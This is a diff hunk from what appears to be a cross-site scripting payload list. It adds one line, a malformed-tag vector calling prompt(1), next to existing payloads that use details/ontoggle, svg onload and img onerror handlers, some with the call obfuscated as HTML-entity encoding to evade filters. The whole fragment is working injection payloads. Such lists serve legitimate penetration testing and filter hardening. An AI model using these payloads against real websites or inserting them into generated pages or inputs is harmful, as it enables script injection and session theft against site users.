@@ -9,6 +9,7 @@
 <details/open/ontoggle=write(1) <
 <details/open/ontoggle=write(1)//
 <brinhosa onclick=confirm()>click
+<brinhosa/="/prompt(1)/"<
 <svg onload=write(7)>
 <img/src="x"/onerror=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;&#x28;&#x31;&#x29;&#xA; <
 <svg/onload=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;&#x28;&#x31;&#x29;&#xA; <
